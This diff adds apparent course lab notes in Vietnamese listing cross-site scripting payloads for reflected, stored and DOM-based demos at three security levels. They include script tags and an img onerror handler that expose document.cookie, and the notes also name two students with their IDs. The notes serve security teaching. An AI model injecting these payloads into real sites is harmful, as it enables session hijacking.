@@ -1,0 +1,30 @@
+CAC CAU LENH DUNG DE THUC THI
+---Demo Reflected XSS:
++ Low: 
+Nhập môn bảo mật thông tin
+<script>alert(document.cookie)</script>
+<script>document.write("<h3>TRAN THI VEN - 52100674 AND NGUYEN DINH DANH - 52100878</h3>");</script>
++ Medium:
+<SCRIPT>alert(document.cookie)</SCRIPT>
++ High:
+<img src=x onerror=alert(document.cookie)>
+
+--Demo Stored XSS:
++ Low: 
+Message:
+<script>alert(document.cookie)</script>
+<script>document.write("<h3>TRAN THI VEN - 52100674 AND NGUYEN DINH DANH - 52100878</h3>");</script>
++ Medium:
+Name: 
+<SCRIPT>alert(document.cookie)</SCRIPT>
++ High:
+Name:
+<img src=x onerror=alert(document.cookie)>
+
+--Demo Dom-Based XSS:
++ Low:
+<script>alert(document.cookie)</script>
++ Medium:
+#<script>alert(document.cookie)</script>
++ High:
+#<script>alert(document.cookie)</script>
